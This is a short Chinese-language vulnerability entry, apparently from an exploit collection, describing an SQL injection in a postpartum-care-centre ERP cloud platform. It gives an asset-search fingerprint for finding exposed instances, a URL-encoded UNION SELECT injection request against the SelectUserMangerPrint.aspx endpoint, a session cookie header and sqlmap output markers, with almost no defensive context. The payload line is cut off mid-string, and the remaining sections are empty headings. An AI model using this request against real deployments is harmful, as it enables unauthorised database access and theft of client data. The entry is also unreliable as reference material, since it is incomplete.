# 月子会所ERP管理云平台SelectUserMangerPrint存在SQL注入漏洞

- **系统**：月子会所ERP管理云平台　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`product="妈妈宝盒-ERP"`
- **请求**：`GET /Page/SalerManager/SelectUserMangerPrint.aspx?id=1%29+UNION+ALL+SELECT+NULL%2CNULL%2CCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%2898%29%2BCHAR%28113%29%2BCHAR%2882%29%2BCHAR%28113%29%2BCHAR%2870%29%2BCHAR%28108%29%2BCHAR%2883%29%2BCHAR%28111%29%2BCHAR%28106%29%2BCHAR%2888%29%2BCHAR%287`
- **关键头**：`Cookie: ASP.NET_SessionId=mf1ihdp1nrlqfspeocl1np1d`

**请求体 / payload**
```
qqxbqRqFlSojXNTpzgnmaqktHLNPqDvpNbZlqJSDRuIMJqzvxq
sqlmap
/Page/SalerManager/SelectUserMangerPrint.aspx?id=1
```

**其他**
- 月子会所ERP管理云平台SelectUserMangerPrint存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 月子会所ERP管理云平台